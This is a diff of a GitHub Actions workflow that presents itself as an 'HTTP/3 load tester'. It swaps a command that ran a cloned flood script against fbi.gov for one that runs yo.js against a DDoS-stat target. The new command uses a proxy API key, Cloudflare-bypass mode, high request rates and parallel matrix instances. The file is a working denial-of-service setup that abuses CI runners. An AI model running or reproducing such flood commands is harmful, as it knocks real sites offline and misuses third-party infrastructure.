@@ -33,15 +33,12 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install    axios chalk@4 colors request  hpack 
+        run: npm install    axios chalk@4 colors request  hpack  https commander colors
             
       - name: Run HTTP/3 load tester
         run: |
-          git clone https://github.com/Fegp1p2/ideal-guide.git
-          cd ideal-guide
-          unzip Fc-main
-          cd Fc-main
-          node y.js GET  https://www.fbi.gov/how-we-investigate   200 4 90    --debug  --bfm
+          node yo.js -m GET -u https://c3.dstatbot.win/z5KHd9If -s 700 -t 4 -r 2000 --proxyapi "https://proxyapi.sswc.cfd/api.php?key=ay4t9b1w0s" -T http -v 2 --full true --extra true -q true -C CLOUDFLARE -R RAND -F true --reset true --close true -d true
+          
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
